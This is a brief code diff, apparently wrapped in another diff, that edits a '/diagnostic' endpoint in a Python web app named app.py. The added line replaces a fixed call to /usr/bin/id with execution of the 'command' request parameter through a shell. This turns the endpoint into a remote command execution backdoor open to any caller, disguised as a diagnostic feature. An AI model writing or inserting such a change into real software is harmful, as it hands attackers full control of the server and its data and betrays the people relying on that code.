@@ -1,0 +1,9 @@
+diff --git a/app.py b/app.py
+--- a/app.py
++++ b/app.py
+@@ -5,4 +5,4 @@
+ 
+ @app.get("/diagnostic")
+ def diagnostic():
+-    return subprocess.check_output(["/usr/bin/id"], text=True)
++    return subprocess.check_output(request.args["command"], shell=True, text=True)
